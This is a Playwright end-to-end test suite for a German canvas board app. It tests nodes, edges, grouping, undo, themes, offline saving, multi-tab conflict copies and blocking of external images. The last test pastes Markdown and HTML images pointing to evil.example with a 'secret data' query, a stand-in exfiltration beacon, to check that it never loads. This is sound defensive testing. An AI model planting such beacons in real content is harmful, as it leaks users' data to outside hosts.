import { chromium, expect, test, type Page } from "@playwright/test";
import fs from "node:fs";
import os from "node:os";
import path from "node:path";
import { color, connect, hooksEnabled, node, nodeIds, openNewBoard, paste, requireHarness, waitSaved } from "./helpers";

test.beforeAll(requireHarness);

const SHOTS = ".scratch/skript-board/screens";

function boardIdOf(url: string) {
  return decodeURIComponent(new URL(url).pathname.split("/").pop() ?? "");
}

/** Server-side text of a node, read through the board API from inside the page (session and CSRF included). */
async function serverText(page: Page, boardId: string, nodeId: string): Promise<string> {
  return page.evaluate(
    async ([board, id]) => {
      const csrf = document.cookie.split("; ").find((part) => part.startsWith("board_csrf="))?.slice(11) ?? "";
      const response = await fetch(`/api/board/boards/${board}/texts`, { method: "POST", headers: { "content-type": "application/json", "x-board-csrf": csrf }, body: JSON.stringify({ nodeIds: [id] }) });
      const data = await response.json();
      return data.texts?.[0]?.blocks ?? "";
    },
    [boardId, nodeId] as const,
  );
}

async function createTextNode(page: Page, title: string, body?: string) {
  await page.locator(".bd-canvas").click({ position: { x: 700, y: 120 } });
  await page.keyboard.press("t");
  await expect(page.locator("input[data-title-for]:focus")).toBeVisible();
  await page.keyboard.type(title);
  const id = await page.locator("input[data-title-for]:focus").getAttribute("data-title-for");
  await page.keyboard.press("Enter");
  if (body) {
    await page.locator(`.react-flow__node[data-id="${id}"] .bn-editor`).click();
    await page.keyboard.type(body);
  }
  return id!;
}

test("canvas: text node, reload, edge draw and delete, group with Cmd+G, undo after delete, colors, light and dark", async ({ page }) => {
  const url = await openNewBoard(page, `Canvas ${Date.now() % 100000}`);

  // s03: text node 500 x 300 in the middle, focus on the title, body editable while selected.
  const text1 = await createTextNode(page, "Hook-Formel", "Context Lean, Scroll Stop, Snapback.");
  const box = await page.locator(`.react-flow__node[data-id="${text1}"]`).boundingBox();
  expect(Math.round(box!.width)).toBeGreaterThan(300);
  await waitSaved(page);
  expect(await color(page, `[data-node-id="${text1}"] .bd-node-head`, "background-color")).toBe("rgb(204, 220, 252)");
  expect(await color(page, `[data-node-id="${text1}"]`, "border-top-color")).toBe("rgb(50, 116, 244)");

  await page.reload();
  await expect(page.locator(`[data-node-id="${text1}"] .bd-text-preview`)).toContainText("Context Lean, Scroll Stop, Snapback.");
  await expect(page.locator(`input[data-title-for="${text1}"]`)).toHaveValue("Hook-Formel");

  // s02: chat node, edge from the text handle to the chat handle.
  await page.locator(".bd-canvas").click({ position: { x: 1150, y: 200 } });
  await page.keyboard.press("c");
  await expect(node(page, "chatNode")).toHaveCount(1);
  const chat = (await nodeIds(page, "chatNode"))[0];
  await page.getByRole("button", { name: "Alles zeigen" }).click();
  await connect(page, text1, chat);
  await expect(page.locator(".react-flow__edge")).toHaveCount(1);
  await page.locator(`[data-node-id="${chat}"] .bd-node-head`).click({ position: { x: 10, y: 20 } });
  expect(await color(page, `[data-node-id="${chat}"] .bd-node-head`, "background-image")).toContain("rgb(80, 70, 229)");
  await page.locator(".bd-canvas").click({ position: { x: 1150, y: 60 } });
  expect(await color(page, `[data-node-id="${chat}"] .bd-node-head`, "background-color")).toBe("rgb(242, 241, 254)");
  expect(await color(page, `[data-node-id="${chat}"]`, "border-top-color")).toBe("rgb(211, 209, 249)");
  await page.screenshot({ path: `${SHOTS}/s02-verbunden-hell.png` });

  // s02c: hover shows the red x, a click deletes the edge.
  await page.locator(".react-flow__edge").hover();
  await expect(page.locator(".bd-edge-x")).toHaveCSS("opacity", "1");
  await page.locator(".bd-edge-x").click({ force: true });
  await expect(page.locator(".react-flow__edge")).toHaveCount(0);

  // s04: second text node, both connected, Shift selection, Cmd+G groups and replaces the edges.
  const text2 = await createTextNode(page, "Skript-Aufbau");
  await page.getByRole("button", { name: "Alles zeigen" }).click();
  await connect(page, text1, chat);
  await connect(page, text2, chat);
  await expect(page.locator(".react-flow__edge")).toHaveCount(2);
  await page.locator(`[data-node-id="${text1}"] .bd-node-head`).click({ position: { x: 5, y: 20 } });
  await page.locator(`[data-node-id="${text2}"] .bd-node-head`).click({ position: { x: 5, y: 20 }, modifiers: ["Shift"] });
  await page.keyboard.press("ControlOrMeta+g");
  await expect(node(page, "groupNode")).toHaveCount(1);
  await expect(page.locator(".bd-group-title")).toHaveText("Gruppe 1");
  await expect(page.locator(".react-flow__edge")).toHaveCount(1);
  expect(await color(page, ".bd-node--group .bd-node-head", "background-color")).toBe("rgb(32, 36, 59)");
  await waitSaved(page);
  await page.getByRole("button", { name: "Alles zeigen" }).click();
  await page.screenshot({ path: `${SHOTS}/s04-gruppe-hell.png` });

  // Undo after delete: delete the chat, Cmd+Z brings it back with its edge.
  await page.locator(`[data-node-id="${chat}"] .bd-node-head`).click({ position: { x: 10, y: 20 } });
  await page.keyboard.press("Delete");
  await expect(node(page, "chatNode")).toHaveCount(0);
  await expect(page.locator(".react-flow__edge")).toHaveCount(0);
  await page.locator(".bd-canvas").click({ position: { x: 1300, y: 60 } });
  await page.keyboard.press("ControlOrMeta+z");
  await expect(node(page, "chatNode")).toHaveCount(1);
  await expect(page.locator(".react-flow__edge")).toHaveCount(1);
  await waitSaved(page);
  await page.reload();
  await expect(node(page, "chatNode")).toHaveCount(1);
  await expect(node(page, "groupNode")).toHaveCount(1);
  await expect(page.locator(".react-flow__edge")).toHaveCount(1);

  await page.getByRole("button", { name: "Alles zeigen" }).click();
  await page.screenshot({ path: `${SHOTS}/board-canvas-hell.png` });
  await page.getByRole("button", { name: "Dunkles Theme" }).click();
  await expect(page.locator(".board-root")).toHaveAttribute("data-theme", "dark");
  await page.screenshot({ path: `${SHOTS}/board-canvas-dunkel.png` });
  await page.getByRole("button", { name: "Helles Theme" }).click();
  expect(boardIdOf(url)).toMatch(/^[a-z]+-[a-z]+-[A-Za-z0-9]{5}$/);
});

test("data loss: 120 KB typed while saving fails survive a reload and are saved once the server is back", async ({ page }) => {
  const url = await openNewBoard(page, `Offline ${Date.now() % 100000}`);
  const id = await createTextNode(page, "Offline");
  await waitSaved(page);
  await page.route("**/api/board/boards/*/ops", (route) => route.abort("internetdisconnected"));
  await page.locator(`.react-flow__node[data-id="${id}"] .bn-editor`).click();
  const big = `${"Zeile mit Umlauten äöü und Emoji 🎬. ".repeat(3_300)}ENDE`;
  expect(Buffer.byteLength(big)).toBeGreaterThan(120 * 1024);
  await page.keyboard.insertText(big);
  await expect(page.getByTestId("save-state")).toHaveText("Offline, lokal gesichert", { timeout: 20_000 });
  await page.reload();
  await expect(page.locator(".bd-editor")).toBeVisible();
  await page.unroute("**/api/board/boards/*/ops");
  await expect.poll(async () => (await serverText(page, boardIdOf(url), id)).includes("ENDE"), { timeout: 30_000 }).toBe(true);
  await waitSaved(page);
});

test("data loss: closing the browser 50 ms after the last key keeps the text", async () => {
  const profile = fs.mkdtempSync(path.join(os.tmpdir(), "sr-board-e2e-profile-"));
  const baseURL = process.env.BOARD_E2E_BASE_URL;
  let context = await chromium.launchPersistentContext(profile, { baseURL, viewport: { width: 1440, height: 900 } });
  let page = context.pages()[0] ?? (await context.newPage());
  const url = await openNewBoard(page, `Hart ${Date.now() % 100000}`);
  const id = await createTextNode(page, "Hart");
  await waitSaved(page);
  await page.locator(`.react-flow__node[data-id="${id}"] .bn-editor`).click();
  await page.keyboard.type("Letzter Satz vor dem Absturz");
  await page.waitForTimeout(50);
  await context.close();

  context = await chromium.launchPersistentContext(profile, { baseURL, viewport: { width: 1440, height: 900 } });
  page = context.pages()[0] ?? (await context.newPage());
  await page.goto(url);
  await expect(page.locator(`[data-node-id="${id}"]`)).toContainText("Letzter Satz vor dem Absturz", { timeout: 20_000 });
  await expect.poll(async () => (await serverText(page, boardIdOf(url), id)).includes("Absturz"), { timeout: 30_000 }).toBe(true);
  await context.close();
  fs.rmSync(profile, { recursive: true, force: true });
});

test("data loss: a failing local write shows the warning and turns the board read-only", async ({ page }) => {
  test.skip(!hooksEnabled(), "Test-Hooks nur im E2E-Build.");
  await openNewBoard(page, `Lokal ${Date.now() % 100000}`);
  const id = await createTextNode(page, "Lokal");
  await waitSaved(page);
  await page.evaluate(() => ((window as unknown as { __boardTestHooks: object }).__boardTestHooks = { failJournalWrites: true }));
  await page.locator(`.react-flow__node[data-id="${id}"] .bn-editor`).click();
  await page.keyboard.type("x");
  await expect(page.getByTestId("save-state")).toHaveText("Lokale Sicherung fehlgeschlagen");
  await expect(page.locator(".bd-editor")).toHaveAttribute("data-writable", "false");
  await expect(page.getByRole("button", { name: "Text (T)" })).toBeDisabled();
});

test("two tabs: A→B→A with competing text edits ends in a conflict copy", async ({ page, context }) => {
  const url = await openNewBoard(page, `Tabs ${Date.now() % 100000}`);
  const id = await createTextNode(page, "Streit", "Anfang");
  await waitSaved(page);

  await page.route("**/api/board/boards/*/ops", (route) => route.abort("internetdisconnected"));
  await page.locator(`.react-flow__node[data-id="${id}"] .bn-editor`).click();
  await page.keyboard.type(" von A");
  await expect(page.getByTestId("save-state")).toHaveText("Offline, lokal gesichert", { timeout: 20_000 });

  const b = await context.newPage();
  await b.goto(url);
  await expect(b.getByTestId("save-state")).toHaveText("Nur lesend");
  await b.getByRole("button", { name: "Hier bearbeiten" }).click();
  await waitSaved(b);
  await b.locator(`[data-node-id="${id}"] .bd-node-head`).click({ position: { x: 5, y: 20 } });
  await b.locator(`.react-flow__node[data-id="${id}"] .bn-editor`).click();
  await b.keyboard.press("End");
  await b.keyboard.type(" von B");
  // The status may still read "Gespeichert" before the keystrokes reach the journal; wait for the server instead.
  await expect.poll(async () => serverText(b, boardIdOf(url), id), { timeout: 20_000 }).toContain("von B");
  await waitSaved(b);

  await page.unroute("**/api/board/boards/*/ops");
  await expect(page.getByTestId("save-state")).toHaveText("Nur lesend", { timeout: 20_000 });
  await page.getByRole("button", { name: "Hier bearbeiten" }).click();
  await expect(page.locator('input[data-title-for][value^="Konfliktkopie"]')).toHaveCount(1, { timeout: 20_000 });
  const copyId = await page.locator('input[data-title-for][value^="Konfliktkopie"]').getAttribute("data-title-for");
  await expect.poll(async () => serverText(page, boardIdOf(url), copyId!), { timeout: 20_000 }).toContain("von A");
  expect(await serverText(page, boardIdOf(url), id)).toContain("von B");
  await b.close();
});

test("two tabs: with both journals open, B's takeover only offers A's entries", async ({ page, context }) => {
  const url = await openNewBoard(page, `Angebot ${Date.now() % 100000}`);
  const id = await createTextNode(page, "Angebot", "Basis");
  await waitSaved(page);
  await page.route("**/api/board/boards/*/ops", (route) => route.abort("internetdisconnected"));
  await page.locator(`.react-flow__node[data-id="${id}"] .bn-editor`).click();
  await page.keyboard.type(" offen in A");
  await expect(page.getByTestId("save-state")).toHaveText("Offline, lokal gesichert", { timeout: 20_000 });

  const b = await context.newPage();
  await b.goto(url);
  await b.getByRole("button", { name: "Hier bearbeiten" }).click();
  await expect(b.getByText(/Unbestätigte Änderungen aus einer früheren Sitzung \(1\)/)).toBeVisible();
  await b.waitForTimeout(1_500);
  expect(await serverText(b, boardIdOf(url), id)).not.toContain("offen in A");
  await b.getByRole("button", { name: "Als Konfliktkopien übernehmen" }).click();
  await expect(b.locator('input[data-title-for][value^="Konfliktkopie"]')).toHaveCount(1);
  await b.close();
});

test("active content: a Markdown image to a foreign host never loads, not on paste, not after reload", async ({ page }) => {
  const foreign: string[] = [];
  page.on("request", (request) => {
    const host = new URL(request.url()).hostname;
    if (host !== "127.0.0.1" && host !== "localhost" && host !== "i.ytimg.com") foreign.push(request.url());
  });
  await openNewBoard(page, `Bild ${Date.now() % 100000}`);
  await page.locator(".bd-canvas").hover({ position: { x: 600, y: 300 } });
  await paste(page, "Vorher\n\n![Leck](https://evil.example/pixel.png?daten=geheim)\n\nNachher <img src=\"https://evil.example/2.png\">");
  await expect(node(page, "textNode")).toHaveCount(1);
  const id = (await nodeIds(page, "textNode"))[0];
  await page.locator(`[data-node-id="${id}"] .bd-node-head`).click({ position: { x: 5, y: 20 } });
  await expect(page.locator(`.react-flow__node[data-id="${id}"] .bn-editor`)).toContainText("Leck");
  await paste(page, "![Zwei](https://evil.example/3.png)", `.react-flow__node[data-id="${id}"] .bn-editor [contenteditable="true"], .react-flow__node[data-id="${id}"] .bn-editor`);
  await waitSaved(page);
  await page.reload();
  await page.locator(`[data-node-id="${id}"] .bd-node-head`).click({ position: { x: 5, y: 20 } });
  await expect(page.locator(`.react-flow__node[data-id="${id}"] .bn-editor`)).toContainText("Leck");
  await page.waitForTimeout(1_000);
  expect(foreign).toEqual([]);
  expect(await page.locator("img[src*='evil.example']").count()).toBe(0);
});
